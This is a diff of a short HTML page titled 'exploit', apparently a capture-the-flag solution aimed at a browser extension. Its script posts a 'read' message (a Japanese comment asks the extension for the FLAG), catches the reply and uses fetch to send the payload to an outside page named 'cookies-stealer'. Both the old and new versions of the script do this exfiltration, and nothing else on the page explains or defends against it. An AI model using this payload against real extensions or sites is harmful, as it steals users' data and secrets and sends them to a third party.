@@ -1,6 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head><title>exploit</title></head>
+<body>
 <script>
-window.postMessage({type:"read"}, "*");
-window.addEventListener("message", e => {
-  fetch("https://masa-pokemon.github.io/cookies-stealer/?cookie=" + encodeURIComponent(JSON.stringify(e.data)))
-});
+  // 拡張機能に「FLAGちょうだい」と要求
+  window.postMessage({type: "read"}, "*");
+
+  // 応答を受け取って外部送信
+  window.addEventListener("message", e => {
+    if (e.data && e.data.payload) {
+      fetch("https://masa-pokemon.github.io/cookies-stealer/?cookie=" +
+            encodeURIComponent(e.data.payload));
+    }
+  });
 </script>
+</body>
+</html>
